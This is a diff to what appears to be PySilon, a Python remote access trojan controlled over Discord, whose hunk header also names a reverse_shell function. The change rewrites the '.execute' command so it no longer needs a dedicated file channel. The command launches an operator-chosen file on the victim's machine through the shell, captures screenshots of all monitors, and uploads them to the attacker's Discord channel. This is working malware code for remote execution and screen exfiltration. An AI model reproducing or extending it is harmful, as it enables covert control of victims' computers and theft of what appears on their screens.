@@ -25,19 +25,17 @@ async def reverse_shell(ctx, cmd_command=None):
 @client.command(name="execute")
 async def execute_file(ctx, file_to_exec=None):
     await ctx.message.delete()
-    if ctx.message.channel.id == channel_ids['file']:
-        if file_to_exec != None:
-            if os.path.exists(ctx.message.content[9:]):
-                try:
-                    subprocess.run('start "" "' + ctx.message.content[9:] + '"', shell=True)
-                    await asyncio.sleep(1)
-                    ImageGrab.grab(all_screens=True).save('ss.png')
-                    await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + ' `[Executed: ' + ctx.message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
-                    subprocess.run('del ss.png', shell=True)
-                    await ctx.send('```Successfully executed: ' + ctx.message.content[9:] + '```')
-                except Exception as e:
-                    await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')
-            else:
-                await ctx.send('```❗ File or directory not found.```')
-        else: return await ctx.send('```Syntax: .execute <filename>```')
-    else: await ctx.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
+    if file_to_exec != None:
+        if os.path.exists(file_to_exec):
+            try:
+                subprocess.run('start "" "' + file_to_exec + '"', shell=True)
+                await asyncio.sleep(1)
+                ImageGrab.grab(all_screens=True).save('ss.png')
+                await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + ' `[Executed: ' + file_to_exec + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
+                subprocess.run('del ss.png', shell=True)
+                await ctx.send('```Successfully executed: ' + file_to_exec + '```')
+            except Exception as e:
+                await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')
+        else:
+            await ctx.send('```❗ File or directory not found.```')
+    else: return await ctx.send('```Syntax: .execute <path/to/file>```')
